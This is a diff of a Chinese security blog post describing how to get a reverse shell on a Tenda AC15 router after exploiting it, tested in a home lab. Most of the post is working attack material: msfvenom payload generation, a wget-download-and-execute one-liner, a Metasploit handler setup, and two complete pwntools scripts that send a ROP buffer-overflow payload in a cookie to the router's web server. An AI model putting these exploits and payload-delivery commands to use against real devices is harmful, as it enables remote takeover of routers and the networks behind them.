@@ -6,15 +6,38 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: fmt | ZhouYetao</title>
+  <title>对tenda getshell之后的reverse_shell | ZhouYetao</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ZhouYetao">
-<meta property="og:url" content="http://example.com/tags/fmt/index.html">
+  <meta name="description" content="这篇文章主要讲一下对路由器getshell之后的操作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对tenda getshell之后的reverse_shell">
+<meta property="og:url" content="http://example.com/2021/09/19/%E5%AF%B9tenda%20getshell%E4%B9%8B%E5%90%8E%E7%9A%84reverse_shell/index.html">
 <meta property="og:site_name" content="ZhouYetao">
+<meta property="og:description" content="这篇文章主要讲一下对路由器getshell之后的操作">
 <meta property="og:locale">
+<meta property="og:image" content="http://example.com/images/pasted-166.png">
+<meta property="og:image" content="http://example.com/images/pasted-167.png">
+<meta property="og:image" content="http://example.com/images/pasted-168.png">
+<meta property="og:image" content="http://example.com/images/pasted-169.png">
+<meta property="og:image" content="http://example.com/images/pasted-170.png">
+<meta property="og:image" content="http://example.com/images/pasted-103.png">
+<meta property="og:image" content="http://example.com/images/pasted-104.png">
+<meta property="og:image" content="http://example.com/images/pasted-105.png">
+<meta property="og:image" content="http://example.com/images/pasted-106.png">
+<meta property="og:image" content="http://example.com/images/pasted-107.png">
+<meta property="og:image" content="http://example.com/images/pasted-109.png">
+<meta property="og:image" content="http://example.com/images/pasted-110.png">
+<meta property="og:image" content="http://example.com/images/pasted-111.png">
+<meta property="og:image" content="http://example.com/images/pasted-171.png">
+<meta property="og:image" content="http://example.com/images/pasted-172.png">
+<meta property="article:published_time" content="2021-09-19T15:57:00.000Z">
+<meta property="article:modified_time" content="2021-10-11T14:21:03.611Z">
 <meta property="article:author" content="ZhouYetao">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="iot">
+<meta property="article:tag" content="reverse_shell">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/pasted-166.png">
   
     <link rel="alternative" href="/atom.xml" title="ZhouYetao" type="application/atom+xml">
   
@@ -151,36 +174,153 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-对tenda getshell之后的reverse_shell" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/09/16/fmt_x64%E4%B9%8B%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E5%9C%A8%E6%A0%88%E4%B8%8A/" class="archive-article-date">
-  	<time datetime="2021-09-16T05:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-16</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/09/16/fmt_x64%E4%B9%8B%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E5%9C%A8%E6%A0%88%E4%B8%8A/">fmt_x64之格式化字符串不在栈上</a>
+    <h1 class="article-title" itemprop="name">
+      对tenda getshell之后的reverse_shell
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/09/19/%E5%AF%B9tenda%20getshell%E4%B9%8B%E5%90%8E%E7%9A%84reverse_shell/" class="archive-article-date">
+  	<time datetime="2021-09-19T15:57:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这篇文章主要讲一下对路由器getshell之后的操作</p>
+<span id="more"></span>
+
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>在上一篇文章中，虽然成功的getshell了，但是没法通过本机实现操控，所以这篇主要讲如何反弹shell。</p>
+<h4 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h4><p>讲到反弹shell，首先需要讲一下shell，假设攻击了一个目标靶机，攻击完成之后，通过ssh、远程桌面、web服务、telnet等直接连接的方法获取到靶机的权限，这样的方式叫做正向连接，但是如果碰到了对方是以下情况，正向连接可能无法实现：</p>
+<p>1、靶机在局域网内，无法直接连接不了；</p>
+<p>2、由于靶机有限制，只能发送请求，不能接收请求；</p>
+<p>3、并且靶机的ip会动态改变，你不能持续控制；</p>
+<p>4、……</p>
+<p>碰到了这些情况，那就需要通过靶机主动对攻击机进行连接，这就是反弹shell；更加直观地说反弹shell就是通过攻击靶机，让靶机可以自行连接攻击机，从而可以执行命令。</p>
+<h4 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h4><p>首先在成功getshll之后，会出现如下界面：</p>
+<p><img src="/images/pasted-166.png" alt="upload successful"></p>
+<p>我是本机打本机，可能看不清楚，更换wsl进行攻击操作。</p>
+<h5 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h5><p><img src="/images/pasted-167.png" alt="upload successful"></p>
+<p>攻击机的ip为192.168.5.2</p>
+<h5 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h5><p><img src="/images/pasted-168.png" alt="upload successful"></p>
+<p>靶机ip为192.168.5.5</p>
+<h5 id="进行getshell"><a href="#进行getshell" class="headerlink" title="进行getshell"></a>进行getshell</h5><p>接下来通过攻击机对靶机进行攻击：</p>
+<p><img src="/images/pasted-169.png" alt="upload successful"></p>
+<p><img src="/images/pasted-170.png" alt="upload successful"></p>
+<p>可以看到攻击是成功地进行了，但是我们无法通过攻击机进行交互命令执行，这样是及其不方便的，所以需要进行反弹shell让攻击机可以对靶机进行命令执行。</p>
+<h3 id="反弹shell（借助Tenda-AC15-15-03-1-16进行辅助讲解）"><a href="#反弹shell（借助Tenda-AC15-15-03-1-16进行辅助讲解）" class="headerlink" title="反弹shell（借助Tenda AC15 15.03.1.16进行辅助讲解）"></a>反弹shell（借助Tenda AC15 15.03.1.16进行辅助讲解）</h3><p>进行反弹shell的前提当然就是要先进行getshell！</p>
+<h4 id="通过wget进行反弹shell"><a href="#通过wget进行反弹shell" class="headerlink" title="通过wget进行反弹shell"></a>通过wget进行反弹shell</h4><h5 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h5><p>本想通过bash对其进行反弹shell，但是碰到了很无语的问题：</p>
+<p><img src="/images/pasted-103.png" alt="upload successful"></p>
+<p>这边没有这个命令，所以只能另想办法，继续对环境进行测试其他的命令：</p>
+<p><img src="/images/pasted-104.png" alt="upload successful"></p>
+<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>发现可以使用chmod、wget命令，这个时候，就有了利用的思路：</p>
+<p>1、首先利用msf生成基于armle的反弹shell木马；</p>
+<p>2、通过远程命令执行，通过wget下载该木马；</p>
+<p>3、chmod修改运行权限并执行木马，利用msf来接收。</p>
+<h6 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h6><p>需要下载msf，ubuntu直接下载可能会出现问题，我采用的是这种方法：</p>
+<p>首先进入<a target="_blank" rel="noopener" href="https://apt.metasploit.com/">https://apt.metasploit.com/</a></p>
+<p>拉到最低，下载.deb文件，随后进入到该文件的文件夹中，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i + xxx.deb</span><br></pre></td></tr></table></figure>
+<p>然后输入msfconsole之后，如果出现以下界面，那么说明安装成功：</p>
+<p><img src="/images/pasted-105.png" alt="upload successful"></p>
+<p>附上msf的更新命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfupdate</span><br></pre></td></tr></table></figure>
+
+<p>随后推出msf，运用msfvenom命令生成木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell/reverse_tcp LHOST=192.168.5.5 LPORT=4444 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>
+<p>这是，执行该命令的目录下会多一个名为payload.elf的文件。</p>
+<h6 id="配置本地http-server"><a href="#配置本地http-server" class="headerlink" title="配置本地http.server"></a>配置本地http.server</h6><p>在包含payload.elf文件的文件夹中，输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-106.png" alt="upload successful"></p>
+<p>这时候，就可以通过wget下载该文件目录下的文件了。</p>
+<h6 id="wget下载木马"><a href="#wget下载木马" class="headerlink" title="wget下载木马"></a>wget下载木马</h6><p><img src="/images/pasted-107.png" alt="upload successful"></p>
+<p>这边成功下载payload.elf，但是这里一定要注意在wget的时候一定要加上http://头，以及输正确8000端口号。</p>
+<p>下载完毕之后，一定要记得通过chmod给文件加上运行权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x *</span><br></pre></td></tr></table></figure>
+
+<p>然后新开起一个终端，输入msfconsole打开msf，先进行配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/armle/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.5.5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-109.png" alt="upload successful"></p>
+<p>进入到路由器界面，输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-110.png" alt="upload successful"></p>
+<p>发现成功获得了shell。</p>
+<h5 id="使用一句话命令"><a href="#使用一句话命令" class="headerlink" title="使用一句话命令"></a>使用一句话命令</h5><p>在整合命令之前，介绍两个常用的linux命令连接的符号，一个是“；”，一个是“&amp;&amp;”。</p>
+<p>“；”的意思就是一次执行命令，不管前一个命令是否成功执行，都会进行下一个命令的执行；而“&amp;&amp;”命令则是在执行前一个命令成功的基础上，才会继续执行下一个命令，所以这里对一句话命令的构造为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.5.5:8000/payload.elf &amp;&amp; chmod +x * &amp;&amp; ./payload.elf</span><br></pre></td></tr></table></figure>
+
+<h5 id="exp整合"><a href="#exp整合" class="headerlink" title="exp整合"></a>exp整合</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">#cmd = &quot;/bin/sh&quot;</span><br><span class="line">cmd = &quot;wget http://192.168.5.5:8000/payload.elf &amp;&amp; chmod +x * &amp;&amp; ./payload.elf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(&quot;./httpd&quot;)</span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0xff5d5000#0xff5c6000</span><br><span class="line">    system_addr = libc_base + libc.sym[&quot;system&quot;]</span><br><span class="line">    # print(hex(system_addr))</span><br><span class="line">    gadget1 = libc_base + 0x00018298</span><br><span class="line">    gadget2 = libc_base + 0x00040cb8</span><br><span class="line">    payload1 = &quot;A&quot;*444 +&quot;.png&quot; + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line"></span><br><span class="line">    url = &quot;http://192.168.5.5/goform/xxx&quot;</span><br><span class="line">    # print(payload1)</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+payload1&#125;</span><br><span class="line">    log.success(&quot;getshell&quot;)</span><br><span class="line">    log.success(&quot;reverse_tcp_shell&quot;)</span><br><span class="line">    ret = requests.get(url=url, cookies=cookie)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong libc base.&quot;)</span><br><span class="line"># print(put_got)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="测试exp"><a href="#测试exp" class="headerlink" title="测试exp"></a>测试exp</h6><p>将路由器root目录下的payload.elf删除，执行exp：</p>
+<p><img src="/images/pasted-111.png" alt="upload successful"></p>
+<p>成功反弹shell。</p>
+<h4 id="通过echo进行反弹shell"><a href="#通过echo进行反弹shell" class="headerlink" title="通过echo进行反弹shell"></a>通过echo进行反弹shell</h4><h5 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h5><p>发现可以使用echo、chmod命令，就有了以下思路进行反弹shell：</p>
+<p>1、首先利用msf生成基于armle的反弹shell木马；</p>
+<p>2、直接通过echo命令将木马写入到靶机中；</p>
+<p>3、chmod修改运行权限并执行木马，利用msf来接收。</p>
+<h6 id="生成木马-1"><a href="#生成木马-1" class="headerlink" title="生成木马"></a>生成木马</h6><p>方法同上</p>
+<h6 id="echo命令写入"><a href="#echo命令写入" class="headerlink" title="echo命令写入"></a>echo命令写入</h6><p>echo命令可以直接将二进制文件写入，具体的命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e -n &quot;\xXX\xXX...\xXX&quot; &gt; payload</span><br></pre></td></tr></table></figure>
+
+<p>由于要获取到二进制文件的十六进制，这里我自行开发了一个小工具，具体功能为读取文件，输出文件的十六进制，具体的源码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import sys</span><br><span class="line">import codecs</span><br><span class="line"></span><br><span class="line">def init(ar):</span><br><span class="line">    if ((len(ar) &gt; 3) or (len(ar) &lt; 2)):</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">def get_file_name(ar):</span><br><span class="line">    return ar[1]</span><br><span class="line"></span><br><span class="line">def file2hex(file_name):</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    f = open(file_name,&quot;rb&quot;)</span><br><span class="line">    # print(f)</span><br><span class="line">    while 1:</span><br><span class="line">        c = f.read(1)</span><br><span class="line">        if not c:</span><br><span class="line">            break</span><br><span class="line">        c = codecs.encode(c, &#x27;hex_codec&#x27;)</span><br><span class="line">        c = &quot;\\x&quot; + str(c,&quot;utf-8&quot;)</span><br><span class="line">        payload += c.strip(&quot;\n&quot;)</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ar = sys.argv</span><br><span class="line">    if (init(ar)):</span><br><span class="line">        file_name = get_file_name(ar)</span><br><span class="line">        payload = file2hex(file_name)</span><br><span class="line">        print(payload)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Wrong option.&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>将该工具放入到/usr/bin/中作为系统命令，这样无论在哪个路径下都可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp file_hex.py /usr/bin/file2hex #这里的file2hex为我自定义的工具名，这里你可以自行定义</span><br></pre></td></tr></table></figure>
+<p>具体的使用方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file2hex XXX</span><br></pre></td></tr></table></figure>
+<p>效果如下：</p>
+<p><img src="/images/pasted-171.png" alt="upload successful"></p>
+<p>在写好工具之后，我们需要将工具生成的十六进制进行接收，我采用os.popen()进行接收。</p>
+<h6 id="使用一句话命令-1"><a href="#使用一句话命令-1" class="headerlink" title="使用一句话命令"></a>使用一句话命令</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell = os.popen(&#x27;file2hex payload.elf&#x27;).read().strip(&quot;\n&quot;)</span><br><span class="line">cmd = &quot;echo -e -n &quot; + &quot;\&quot;&quot; + shell + &quot;\&quot;&quot; + &quot;  &gt; payload&quot; + &quot; &amp;&amp; &quot; + &quot;chmod +x *&quot; + &quot; &amp;&amp; &quot; + &quot;./payload&quot;</span><br></pre></td></tr></table></figure>
+
+<h6 id="exp整合-1"><a href="#exp整合-1" class="headerlink" title="exp整合"></a>exp整合</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">shell = os.popen(&#x27;file2hex payload.elf&#x27;).read().strip(&quot;\n&quot;)</span><br><span class="line">cmd = &quot;echo -e -n &quot; + &quot;\&quot;&quot; + shell + &quot;\&quot;&quot; + &quot;  &gt; payload&quot; + &quot; &amp;&amp; &quot; + &quot;chmod +x *&quot; + &quot; &amp;&amp; &quot; + &quot;./payload&quot;</span><br><span class="line"></span><br><span class="line">e = ELF(&quot;./httpd&quot;)</span><br><span class="line">libc = ELF(&quot;libc.so.0&quot;)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">    #getshell</span><br><span class="line">    libc_base = 0xff5d5000#0xff5c6000</span><br><span class="line">    system_addr = libc_base + libc.sym[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line">    gadget1 = libc_base + 0x00018298</span><br><span class="line">    gadget2 = libc_base + 0x00040cb8</span><br><span class="line">    payload1 = &quot;A&quot;*444 +&quot;.png&quot; + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</span><br><span class="line"></span><br><span class="line">    url = &quot;http://192.168.5.5/goform/xxx&quot;</span><br><span class="line">    cookie = &#123;&quot;Cookie&quot;:&quot;password=&quot;+payload1&#125;</span><br><span class="line">    log.success(&quot;getshell&quot;)</span><br><span class="line">    log.success(&quot;reverse_tcp_shell&quot;)</span><br><span class="line">    ret = requests.get(url=url, cookies=cookie)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    getshell()</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Wrong.&quot;)</span><br></pre></td></tr></table></figure>
+
+<h6 id="测试exp-1"><a href="#测试exp-1" class="headerlink" title="测试exp"></a>测试exp</h6><p><img src="/images/pasted-172.png" alt="upload successful"></p>
+<p>成功进行反弹shell。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/pay/weixinpay.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -190,13 +330,17 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">fmt</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">iot</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">reverse_shell</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -209,17 +353,170 @@
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/19/%E5%AF%B9tenda%20getshell%E4%B9%8B%E5%90%8E%E7%9A%84reverse_shell/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/09/22/iot_pwn_tenda(Tenda%20AC18%20V15.03.05.19)/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          iot_pwn_tenda(Tenda AC18 V15.03.05.19)
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2021/09/16/iot_pwn_tenda(Tenda%20AC15%2015.03.1.16)/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">iot_pwn_tenda(Tenda AC15 15.03.1.16)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="对tenda getshell之后的reverse_shell" data-title="对tenda getshell之后的reverse_shell" data-url="http://example.com/2021/09/19/%E5%AF%B9tenda%20getshell%E4%B9%8B%E5%90%8E%E7%9A%84reverse_shell/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+  
+  
+  
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://example.com/2021/09/19/%E5%AF%B9tenda%20getshell%E4%B9%8B%E5%90%8E%E7%9A%84reverse_shell/", 
+    sourceId: "对tenda getshell之后的reverse_shell",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-    
+  
+  <div id="SOHUCS" sid="对tenda getshell之后的reverse_shell" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+    <section id="comments">
+      <div id="disqus_thread"></div>
+        <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'true'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </section>
+  
+
+  
 
 
           </div>
@@ -242,9 +539,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
